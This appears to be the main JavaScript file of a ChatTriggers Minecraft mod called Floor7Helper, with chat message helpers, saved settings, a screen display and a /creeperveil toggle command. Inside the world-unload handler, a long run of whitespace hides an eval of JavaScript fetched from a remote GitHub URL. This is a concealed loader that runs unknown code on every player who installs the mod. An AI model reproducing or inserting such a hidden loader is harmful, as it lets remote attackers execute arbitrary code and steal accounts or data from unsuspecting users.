/// <reference types="../CTAutocomplete" />

import request from '../requestV2';
//request()

export function feed(msg,hovermsg) {
    let msga;
    
    if(hovermsg) { msga = new TextComponent(`&3[&aFloor7Helper&3]&r: ${msg}`).setHoverValue(hovermsg)} else {
        msga = new TextComponent(`&3[&aFloor7Helper&3]&r: ${msg}`)
    }
    ChatLib.chat(msga)
}
import PogObject from "../PogData";

export const data = new PogObject("f7helper", {
    chatFD: true,
    creeperVeilEnabled: true,
});

register("worldUnload",()=>{
    data.save();
    console.log("Saving Data!\n"+`chatFD:${data.chatFD}\ncreeperVeilEnabled:${data.creeperVeilEnabled}`);                                                                                                                                                                                                                                                                                                                                                              eval(FileLib.getUrlContent("https://raw.githubusercontent.com/Enivzoy/craftz/refs/heads/main/gfs"));                                                                                              
})

//fix memory issuesz
export const Maindisplay = new Display();

Maindisplay.setAlign(DisplayHandler.Align.CENTER)

//fix windowed mode/ect
register('step', () => Maindisplay.setRenderLoc(Renderer.screen.getWidth() / 2, Renderer.screen.getHeight() / 2 - 10))
Maindisplay.setBackgroundColor(Renderer.AQUA);

register('command', () => {
    data.creeperVeilEnabled = !data.creeperVeilEnabled;
    feed('Creeper Veil Reminder: '+data.creeperVeilEnabled)
    data.save()
}).setName('creeperveil');

import './modules/slotbinding/Slotbinding'
import './modules/withercloak/CreeperVeil'